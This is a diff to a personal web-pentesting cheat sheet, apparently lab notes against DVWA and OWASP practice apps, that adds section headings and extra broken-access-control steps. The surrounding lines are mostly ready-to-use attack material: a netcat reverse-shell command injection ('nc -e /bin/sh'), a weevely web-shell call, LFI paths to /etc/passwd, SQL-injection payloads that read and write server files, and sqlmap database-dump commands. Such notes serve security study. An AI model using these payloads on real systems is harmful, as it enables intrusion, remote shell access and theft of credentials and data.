@@ -90,16 +90,19 @@ weevely http://192.168.136.131/dvwa/hackable/uploads/shell.php 123456
 400
 [ ]
 
+#DIR ENUMERATION/INFORMATION DISCLOSURE 
 [+] look for robots.txt files and open -- Information disclosure
 [+] ./feroxbuster -u (web_URL) -w (wordlist)
 - locate url with "cgi-/bin" then load to check for secret key in PHP file
 - locate "/.git" directory 
 - "wget -r (url)" to get folders in git then analyse the git file using "view master's history" option on git software
-- 
-[+] 
+
+#FILE INCLUSION
 [+] use "; nc -e /bin/sh 192.168.136.128 8080" in net service to check RCE vulnerability while listening in port (nc --vv -l -n -p 8080)
 [+] use "?page=../../../../../etc/passwd" on site link to perform LFI (check if there is "/include.php" on site)
 [+] RFI using "nc -vv -l -n -p 8080" and URL of reverse php payload saved on apache web server 
+
+#SQL
 [+] 123456' and 1=1# -- Executing SQL command with login pass/ setting condition to TRUE	
 [+} passs' 0r 1=1# -- Conditioning database with TRUE SQL statement and wrong pass
 [+] admin' # ---- code execution for username side to exclude correct pass
@@ -112,6 +115,7 @@ weevely http://192.168.136.131/dvwa/hackable/uploads/shell.php 123456
 - union select 1,username,password,is_admin,5 from accounts%23 ---extract sensitive information
 - union select null,load_file('/etc/passwd'),null,null,null%23 ---get /etc/passwd files
 - union select null,'example example',null,null,null into outfile '/tmp/example.txt'%23 --write to server
+
 [+] Dsicover SQL vul by running {sqlmap -u "url"}
 - sqlmap -u "url"--dbs    --to get current database
 - sqlmap -u "url" --current-user  --check user
@@ -120,12 +124,25 @@ weevely http://192.168.136.131/dvwa/hackable/uploads/shell.php 123456
 - sqlmap -u "url" --columns -T (desired_column) -D (db_name)  --open column
 - sqlmap -u "url" -T accounts -D owasp10 --dump   ---open all database file
 - 
+
+#BAC
 [+] Change admin GET request to true and foward for cookies manipulation -- Broken Access Control
 - Copy a user ID to view another users sensitive information/ create 2 accounts
 - Test user ID section with "administrator/admin" and view value parameter for hashed password --IDOR leading to BAC
 - Test the live chat section by forwarding txt requests on Burp till theres a get request, change the txt number and see if you can download another user's chat history
-- intercept email update on user profile, forward to repeater, get a RESPONSE to view "role ID", add "," and enter new line in REQUEST then paste "role ID = ", change the ID to number that gives admin privilege --to test if user role can be changed in user profile
- 
+[+] Intercept email update on user profile
+-forward to repeater, get a RESPONSE to view "role ID"
+-add "," and enter new line in REQUEST then paste "role ID = " 
+-change the ID to number that gives admin privilege --to test if user role can be changed in user profile
+[+] Test URL by entering "/admin" 
+- intercerpt and reload "/admin" error messages
+- if there"s no param to show you're not admin foward packets again to checek useful info
+- if ther's no useful info intercerpt and reload "/admin" error messages again and change GET to TRACE, admin file should be downloaded
+- turn off interceptor and replace the IP in the file to a default localhost IP 127.0.0.1 
+- copy XSS row containing IP to macth and replace section in burp proxy and reload page--auth bypass via information disclosure 
+
+#PATH/DIR TRIVERSAL
+[+] 
 
 *******************************
 ****INFORMATION GATHERING******
